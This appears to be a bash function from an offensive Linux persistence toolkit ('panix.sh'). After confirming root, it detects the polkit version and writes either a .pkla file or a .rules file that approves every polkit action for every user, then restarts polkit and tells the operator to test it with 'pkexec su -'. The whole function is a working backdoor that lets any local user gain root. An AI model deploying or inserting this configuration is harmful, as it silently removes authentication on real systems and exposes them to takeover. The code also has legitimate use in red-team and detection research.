setup_polkit() {
	local polkit_version=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_polkit() {
		echo "Usage: sudo ./panix.sh --polkit"
		echo "--examples            Display command examples"
		echo "--help|-h             Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--examples )
				echo "Example:"
				echo "sudo ./panix.sh --polkit"
				exit 0
				;;
			--help | -h )
				usage_polkit
				exit 0
				;;
			* )
				echo "Invalid option: $1"
				echo "Try 'sudo ./panix.sh --polkit --help' for more information."
				exit 1
				;;
		esac
		shift
	done

	# Ensure bc is installed for version comparison.
	if ! command -v bc &>/dev/null; then
		echo "Error: bc is required for version comparison. Please install bc (e.g., sudo apt install bc or sudo yum install bc)."
		exit 1
	fi

	# Check polkit version.
	if command -v pkaction &>/dev/null; then
		# Modified regex to match integer versions or dotted versions.
		polkit_version=$(pkaction --version | grep -oE '[0-9]+(\.[0-9]+){0,2}')
	else
		echo "[-] Error: Polkit is not installed."
		exit 1
	fi

	if [[ -z $polkit_version ]]; then
		echo "[-] Error: Unable to determine polkit version."
		exit 1
	fi

	# Compare version. For versions output as integers (like "124") this will treat them as greater than 0.106.
	if [[ $(echo "$polkit_version < 0.106" | bc -l) -eq 1 ]]; then
		echo "[!] Polkit version < 0.106 detected. Setting up persistence using .pkla files."

		# Ensure directory structure exists.
		mkdir -p /etc/polkit-1/localauthority/50-local.d/

		# Write the .pkla file.
		cat <<-EOF > /etc/polkit-1/localauthority/50-local.d/panix.pkla
		[Allow Everything]
		Identity=unix-user:*
		Action=*
		ResultAny=yes
		ResultInactive=yes
		ResultActive=yes
		EOF

		echo "[+] Persistence established via .pkla file."
	else
		echo "[!] Polkit version >= 0.106 detected. Setting up persistence using .rules files."

		# Ensure directory structure exists.
		mkdir -p /etc/polkit-1/rules.d/

		# Write the .rules file.
		cat <<-EOF > /etc/polkit-1/rules.d/99-panix.rules
		polkit.addRule(function(action, subject) {
			return polkit.Result.YES;
		});
		EOF

		echo "[+] Persistence established via .rules file."
	fi

	# Restart polkit.
	if systemctl restart polkit; then
		echo "[+] Polkit service restarted."
	else
		echo "[-] Failed to restart polkit service."
		exit 1
	fi

	echo "[!] Run pkexec su - to test the persistence."
}
